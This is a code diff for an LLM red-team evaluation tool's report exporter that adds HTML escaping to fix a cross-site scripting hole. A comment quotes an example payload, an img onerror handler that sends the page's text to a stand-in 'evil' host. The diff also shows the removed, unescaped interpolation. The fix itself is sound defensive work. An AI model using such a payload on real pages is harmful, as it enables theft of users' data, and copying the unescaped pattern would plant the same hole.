@@ -65,13 +65,32 @@ function toSARIF(run: StoredRun): string {
   return JSON.stringify(sarif, null, 2);
 }
 
-function toHTML(run: StoredRun): string {
+/**
+ * HTML-escape every interpolation in `toHTML`.
+ *
+ * The report embeds LLM OUTPUT — the exact text a red-team eval is designed to
+ * make adversarial. Interpolating it raw meant a case output of
+ * `<img src=x onerror="fetch('https://evil/'+document.body.innerText)">` executed
+ * the moment an engineer opened report.html, exfiltrating the whole report
+ * (prompts, outputs, model + provider names) from a file:// origin.
+ */
+function escapeHtml(value: unknown): string {
+  return String(value)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+/** Exported for the XSS regression test; not part of the CLI's public surface. */
+export function toHTML(run: StoredRun): string {
   const statusColor = run.passRate >= 0.8 ? "#22c55e" : run.passRate >= 0.5 ? "#eab308" : "#ef4444";
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>EvalGuard Report - ${run.name}</title>
+  <title>EvalGuard Report - ${escapeHtml(run.name)}</title>
   <style>
     body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0a0a0a; color: #e5e5e5; }
     h1 { color: #fff; } h2 { color: #a3a3a3; margin-top: 32px; }
@@ -85,8 +104,8 @@ function toHTML(run: StoredRun): string {
 </head>
 <body>
   <h1>EvalGuard Report</h1>
-  <h2>${run.name} <span class="badge">${(run.passRate * 100).toFixed(1)}%</span></h2>
-  <p class="meta">ID: ${run.id} | Model: ${run.model} | Provider: ${run.provider} | ${run.timestamp}</p>
+  <h2>${escapeHtml(run.name)} <span class="badge">${(run.passRate * 100).toFixed(1)}%</span></h2>
+  <p class="meta">ID: ${escapeHtml(run.id)} | Model: ${escapeHtml(run.model)} | Provider: ${escapeHtml(run.provider)} | ${escapeHtml(run.timestamp)}</p>
   <table>
     <tr><th>Metric</th><th>Value</th></tr>
     <tr><td>Pass Rate</td><td>${(run.passRate * 100).toFixed(1)}%</td></tr>
@@ -96,7 +115,7 @@ function toHTML(run: StoredRun): string {
     <tr><td>Total</td><td>${run.total}</td></tr>
     <tr><td>Latency</td><td>${run.latencyMs}ms</td></tr>
   </table>
-  ${run.results ? `<h2>Case Results</h2><table><tr>${Object.keys(run.results[0] ?? {}).map((k) => `<th>${k}</th>`).join("")}</tr>${run.results.map((r: Record<string, unknown>) => `<tr>${Object.values(r).map((v) => `<td>${String(v)}</td>`).join("")}</tr>`).join("")}</table>` : ""}
+  ${run.results ? `<h2>Case Results</h2><table><tr>${Object.keys(run.results[0] ?? {}).map((k) => `<th>${escapeHtml(k)}</th>`).join("")}</tr>${run.results.map((r: Record<string, unknown>) => `<tr>${Object.values(r).map((v) => `<td>${escapeHtml(v)}</td>`).join("")}</tr>`).join("")}</table>` : ""}
 </body>
 </html>`;
 }
